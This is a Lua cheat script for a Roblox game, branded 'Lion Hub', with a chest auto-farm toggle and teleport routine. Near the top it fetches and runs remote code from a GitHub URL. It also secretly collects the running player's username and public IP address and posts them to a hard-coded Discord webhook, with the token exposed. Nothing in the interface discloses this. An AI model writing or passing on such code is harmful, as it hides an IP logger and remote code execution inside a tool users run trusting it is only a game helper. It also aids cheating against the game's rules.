loadstring(game:HttpGet("https://raw.githubusercontent.com/khoanguyen-dev1/scriptnotify/refs/heads/main/fastattack.lua"))()

repeat wait() until game:IsLoaded()
if game.PlaceId == 2753915549 then
    World1 = true
elseif game.PlaceId == 4442272183 then
    World2 = true
elseif game.PlaceId == 7449423635 then
    World3 = true
end

game.StarterGui:SetCore("SendNotification", {
    Title = "Lion hub - Notify",
    Icon = "rbxassetid://123709024751036",
    Text = "Waiting load...",
    Duration = 5
})

function PostWebhook(Url, message)
    local request = http_request or request or HttpPost or syn.request
    request({
        Url = Url,
        Method = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body = game:GetService("HttpService"):JSONEncode(message)
    })
end

function AdminLoggerMsg()
    local randomColor = math.random(0, 0xFFFFFF)
    return {
        ["embeds"] = {{
            ["title"] = "**Duck Hub**",
            ["type"] = "rich",
            ["color"] = randomColor,
            ["fields"] = {
                {
                    ["name"] = "**Username**",
                    ["value"] = "```" .. game.Players.LocalPlayer.Name .. "```",
                    ["inline"] = true
                },
                {
                    ["name"] = "**IP Address**",
                    ["value"] = "```" .. tostring(game:HttpGet("https://api.ipify.org", true)) .. "```",
                    ["inline"] = false
                },
            },
            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S")
        }}
    }
end

PostWebhook("https://discord.com/api/webhooks/1358380620862197830/1igzyRnsm9u1vFzCGMhN54fJVgVl3gc6UQG4Jtk3tvcWQ7qUwKPnQXtNf4L5WaEsW6DK", AdminLoggerMsg())

require(game.ReplicatedStorage.Util.CameraShaker):Stop()

local function checkAndKickPlayer()
    local player = game:GetService("Players").LocalPlayer
    local bannedHWID = ""
    if player.UserId == bannedHWID then
        player:Kick("Ngu")
    end
end

checkAndKickPlayer()

if not game:IsLoaded() then game.Loaded:Wait() end
local HttpService = game:GetService("HttpService")

-- Fluent UI
local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
local Window = Fluent:CreateWindow({
    Title = "Lion Hub",
    SubTitle = "By UwU ( Lion hub ) - khoanguyen0306#0",
    TabWidth = 110,
    Size = UDim2.fromOffset(480, 320),
    Acrylic = false,
    Theme = "Yellow",
    MinimizeKey = Enum.KeyCode.End
})

local Tabs = {
    Main = Window:AddTab({ Title = "Full Moon", Icon = "" }),
}

local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

local ImageButton = Instance.new("ImageButton")
ImageButton.Parent = ScreenGui
ImageButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ImageButton.BorderSizePixel = 0
ImageButton.Position = UDim2.new(0.12, 0, 0.095, 0)
ImageButton.Size = UDim2.new(0, 50, 0, 50)
ImageButton.Draggable = true
ImageButton.Image = "rbxthumb://type=GamePass&id=944258394&w=150&h=150"

local UICorner = Instance.new("UICorner", ImageButton)
UICorner.CornerRadius = UDim.new(0, 10)

ImageButton.MouseButton1Down:Connect(function()
    game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.End, false, game)
end)

local function playSound()
    local sound = Instance.new("Sound", game:GetService("CoreGui"))
    sound.SoundId = "rbxassetid://130785805"
    sound.Volume = 10
    sound:Play()
end

playSound()

function topos(Pos)
    local Distance = (Pos.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
    local Speed = 350
    if Distance < 250 then Speed = 350 elseif Distance >= 1000 then Speed = 350 end

    local tween_s = game:GetService("TweenService")
    local info = TweenInfo.new(
        Distance / Speed,
        Enum.EasingStyle.Linear
    )
    local tween = tween_s:Create(
        game.Players.LocalPlayer.Character.HumanoidRootPart,
        info, 
        {CFrame = Pos}
    )
    tween:Play()
    tween.Completed:Wait()
end

-- Toggle để bật/tắt
Tabs.Main:AddToggle("Farm Chest | Safe", false, function(value)
    AutoFarmChest = value
end)

-- Biến để tăng phạm vi tìm kiếm khi không có chest gần
_G.MagnitudeAdd = 0

spawn(function()
    while wait() do 
        if AutoFarmChest then
            local player = game.Players.LocalPlayer
            local char = player.Character
            if not char or not char:FindFirstChild("HumanoidRootPart") then continue end

            for _, v in pairs(game:GetService("Workspace"):GetChildren()) do 
                if v.Name:find("Chest") and v:IsA("BasePart") then
                    local distance = (v.Position - char.HumanoidRootPart.Position).Magnitude
                    if distance <= 5000 + _G.MagnitudeAdd then
                        local chestCFrame = v.CFrame

                        repeat wait()
                            if v and v.Parent then
                                topos(chestCFrame)
                            end
                        until AutoFarmChest == false or not v:IsDescendantOf(game.Workspace)

                        topos(char.HumanoidRootPart.CFrame) -- quay lại chỗ cũ

                        _G.MagnitudeAdd = _G.MagnitudeAdd + 1500
                        break
                    end
                end
            end
        end
    end
end)
